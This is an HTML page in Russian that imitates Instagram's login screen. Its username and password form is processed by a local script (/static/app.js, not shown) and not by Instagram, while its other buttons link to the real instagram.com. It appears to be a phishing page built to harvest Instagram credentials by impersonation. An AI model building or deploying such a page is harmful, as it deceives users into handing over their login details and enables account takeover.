<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Instagram</title>
<link rel="stylesheet" href="/static/style.css">
</head>
<body>
<div class="wrap">
  <div class="logo">Instagram</div>

  <form id="verifyForm" style="width: 100%;">
    <input type="text" id="username" placeholder="Телефон, имя пользователя или email" required autocomplete="off" autocapitalize="off" autocorrect="off">
    <input type="password" id="password" placeholder="Пароль" required autocomplete="off">
    <button type="submit" class="btn" id="submitBtn">Войти</button>
  </form>

  <div id="msg" class="msg"></div>

  <div class="or"><span>ИЛИ</span></div>

  <button class="fb-btn" type="button" onclick="window.location.href='https://www.instagram.com'">
    <span class="fb-icon">f</span> Войти через Facebook
  </button>

  <a href="https://www.instagram.com/accounts/password/reset/" class="forgot">Забыли пароль?</a>
</div>

<div class="signup-box">
  <span>У вас нет аккаунта?</span>
  <a href="https://www.instagram.com/accounts/emailsignup/">Зарегистрироваться</a>
</div>

<script src="/static/app.js"></script>
</body>
</html>
